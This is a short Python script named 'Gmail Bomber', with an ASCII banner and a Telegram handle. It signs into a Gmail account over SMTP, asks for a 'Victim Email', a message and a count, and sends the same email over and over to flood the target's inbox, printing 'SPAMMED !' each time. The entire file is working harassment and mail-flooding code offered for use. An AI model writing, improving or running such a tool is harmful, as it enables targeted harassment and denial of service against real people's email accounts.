#Gmail Bomber by tomvisserr01
#  _______ _                 _           __                 _                     _                 _ _
# |__   __| |               | |         / _|               | |                   | |               | (_)            
#    | |  | |__   __ _ _ __ | | _____  | |_ ___  _ __    __| | _____      ___ __ | | ___   __ _  __| |_ _ __   __ _ 
#    | |  | '_ \ / _` | '_ \| |/ / __| |  _/ _ \| '__|  / _` |/ _ \ \ /\ / | '_ \| |/ _ \ / _` |/ _` | | '_ \ / _` |
#    | |  | | | | (_| | | | |   <\__ \ | || (_) | |    | (_| | (_) \ V  V /| | | | | (_) | (_| | (_| | | | | | (_| |
#    |_|  |_| |_|\__,_|_| |_|_|\_|___/ |_| \___/|_|     \__,_|\___/ \_/\_/ |_| |_|_|\___/ \__,_|\__,_|_|_| |_|\__, |
#                                                                                                              __/ |
#                                                                                                             |___/ 
print (''' Telegram \033[93m@ARNAB431\033[97m ''')
import smtplib
import platform
import getpass
import sys
import datetime

smtp   = raw_input("Enter Your Mail Server : ")
if smtp == 'gmail':
		server = smtplib.SMTP('smtp.gmail.com',587)
		server.starttls()

		email     = raw_input("Enter Your Email : ")
		password  = getpass.getpass("Enter your Password:")

		if not  email  and not password:
				print ("You must Login to your Gmail")
		else:
				server.login(email,password)
				print ("Successfully Signed in")
				
				send = raw_input("Please Enter Your Victim Email : ")

				print("Enter number of times you want to flood")
				thread= int(raw_input("Count : "))
				

				msg = raw_input("Enter Your Message :\n")
				
				

				for count in range(int(thread)):
					server.sendmail(email,send,msg)
					print (count,"SPAMMED ! ")



				server.quit()

else:
		print("You Must Choose 'gmail' ")				


#No comments. Simply waste.
#What you tryna lookin here.

